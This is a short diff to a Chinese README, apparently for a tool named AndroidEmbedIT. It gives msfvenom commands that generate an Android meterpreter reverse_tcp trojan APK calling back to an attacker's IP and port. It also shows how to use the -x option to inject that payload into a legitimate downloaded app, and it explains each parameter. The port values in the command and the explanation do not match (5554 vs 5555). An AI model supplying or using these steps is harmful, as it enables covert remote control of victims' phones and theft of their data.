@@ -1,4 +1,18 @@
 ## AndroidEmbedIT可以配合meterpreter生成的木马msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.169.76 lport=445 R > Desktop/123.apk进行
+或（msfvenom -x you .apk -p android/meterpreter/reverse_tcp LHOST=youip LPORT=5554 -o aa.apk
+
+参数说明：
+
+you.apk (刚才下载的app名称)
+
+youip:(你的ip地址 通过ipconfig命令查看)
+
+5555:本地端口
+
+-o:生成新的APP 这里生成的是aa.apk
+
+
+）
 
 
 监听
